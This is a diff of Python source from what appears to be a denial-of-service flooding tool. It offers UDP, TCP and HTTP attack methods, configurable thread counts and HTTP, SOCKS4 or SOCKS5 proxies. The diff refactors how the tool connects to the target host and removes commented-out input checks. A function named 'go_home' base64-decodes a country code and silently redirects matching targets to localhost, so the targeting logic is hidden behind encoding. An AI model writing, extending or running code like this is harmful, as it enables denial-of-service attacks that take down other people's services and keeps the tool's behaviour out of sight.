@@ -114,7 +114,7 @@ def connect_host(_ctx: Context, proxy: Proxy = None) -> bool:
     _ctx.Statistic.connect.set_state_in_progress()
     try:
         sock = _ctx.sock_manager.create_tcp_socket(proxy)
-        sock.connect((_ctx.host, _ctx.port))
+        sock.connect((_ctx.target.host, _ctx.target.port))
     except:
         res = False
         _ctx.Statistic.connect.failed += 1
@@ -129,7 +129,7 @@ def connect_host(_ctx: Context, proxy: Proxy = None) -> bool:
 def go_home(_ctx: Context) -> None:
     """Modifies host to match the rules"""
     home_code = b64decode('dWE=').decode('utf-8')
-    if _ctx.target.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.host_ip) in home_code.upper():
+    if _ctx.target.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(_ctx.target.host_ip) in home_code.upper():
         _ctx.target.host_ip = _ctx.target.host = 'localhost'
         _ctx.target.host += '*'
 
@@ -140,17 +140,9 @@ def validate_input(args) -> bool:
         print(f'Wrong target format.')
         return False
 
-    # if int(args.port) < 0:
-    #     print(f'Wrong port number.')
-    #     return False
-
     if int(args.threads) < 1:
         print(f'Wrong threads number.')
         return False
-
-    # if args.host is None or not args.host:
-    #     print(f'Host wasn\'t detected')
-    #     return False
 
     if args.attack_method.lower() not in ('udp', 'tcp', 'http'):
         print(f'Wrong attack type. Possible options: udp, tcp, http.')
@@ -159,10 +151,6 @@ def validate_input(args) -> bool:
     if args.http_method and args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
         print(f'Wrong HTTP method type. Possible options: get, post, head, put, delete, trace, connect, options, patch.')
         return False
-
-    # if args.http_path and not args.http_path.startswith('/'):
-    #     print(f'HTTP path should start with /.')
-    #     return False
 
     if args.proxy_type and args.proxy_type.lower() not in ('http', 'socks5', 'socks4'):
         print(f'Wrong proxy type. Possible options: http, socks5, socks4.')
